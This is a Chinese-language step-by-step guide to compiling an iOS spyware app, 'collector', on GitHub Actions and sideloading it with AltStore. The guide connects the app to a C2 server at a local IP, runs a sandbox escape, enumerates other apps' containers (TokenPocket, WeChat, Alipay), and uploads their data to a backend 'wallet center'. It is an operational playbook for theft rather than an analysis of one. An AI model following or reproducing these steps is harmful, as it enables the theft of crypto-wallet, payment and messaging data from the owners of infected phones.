# collector · 用 GitHub Actions 编译（无需 Mac）

> 目标：在 Windows 上拿到 `collector-unsigned.ipa`，再用已装好的 AltStore 签名安装到手机。
> 全流程约 6–10 分钟，免费。

---

## 第 1 步：注册/登录 GitHub

https://github.com → Sign up（有账号直接登录）。

## 第 2 步：新建仓库

右上 **+** → **New repository**

- Repository name：`collector`
- 选 **Private**（推荐）
- 不要勾 README/gitignore
- 点 **Create repository**

## 第 3 步：上传本包内容

在仓库页点 **uploading an existing file**（或 Add file → Upload files），把 `collector-github.zip` **解压后**里面的内容拖进去：

```
.github/workflows/build-collector.yml
Sources/CollectorApp.swift
Sources/ContentView.swift
Sources/Harvester.swift
Sources/Uploader.swift
Sources/Collector-Bridging-Header.h
Bridge/worse_query.h  worse_query.m  pathleak.h  pathleak.m
project.yml
Collector.entitlements
README.md
```

> 关键：`.github/workflows/` 必须保持这个层级，否则 Actions 看不到工作流。

点 **Commit changes**。

## 第 4 步：运行构建

1. 仓库顶部 **Actions**
2. 左侧 **Collector · iOS 27 采集端** → 右侧 **Run workflow**
3. Bundle ID 留默认 `com.94zero.collector` → **Run workflow**
4. 等 5–8 分钟，绿勾后点进这次运行
5. 页面底部 **Artifacts** → 下载 **collector-unsigned-ipa**

解压得到 `collector-unsigned.ipa`。

## 第 5 步：用 AltStore 安装

1. 电脑上把 IPA 传到手机（微信文件传输助手 / 邮件 / iCloud Drive 都行），或放进「文件」App
2. 手机打开 **AltStore** → **My Apps** → 左上 **+**
3. 选 `collector-unsigned.ipa` → 安装
4. 安装时会再次出现 **Review Permissions**（App Groups）→ **Approve**

## 第 6 步：对接后台

1. 打开 collector
2. `C2` 填：`http://192.168.100.10:8080`（手机与电脑同一 WiFi 才通；不通就走公网隧道）
3. 点 **发送测试日志到 C2** → 后台「运行日志」应出现 `collector` 一条
4. 点 **① 测试沙盒逃逸** → 日志显示 `✅ 扩展句柄 = <数字>`
5. 点 **② 枚举其他 App 容器** → 列表出现 TokenPocket / 微信 / 支付宝（带绿色标签）
6. 勾选目标 → **③ 读取并上传** → 后台「设备 / 数据采集 / 钱包中心」出现数据

---

## 编译失败怎么办

把 Actions 页面里失败的步骤日志（最后 50 行）发回来，常见两类：

| 报错 | 处理 |
|---|---|
| `xcodegen: command not found` | brew 安装失败，重跑一次即可 |
| `error: Signing for "Collector" requires a development team` | 说明 `CODE_SIGNING_ALLOWED=NO` 没生效，检查 workflow 是否被改动 |
| `No such file: Collector.entitlements` | 上传时漏了 entitlements 文件 |

## 安全提醒

- 仓库建议 **Private**；
- 这个 IPA 不带签名，任何人都能重新签名安装，不要外传。
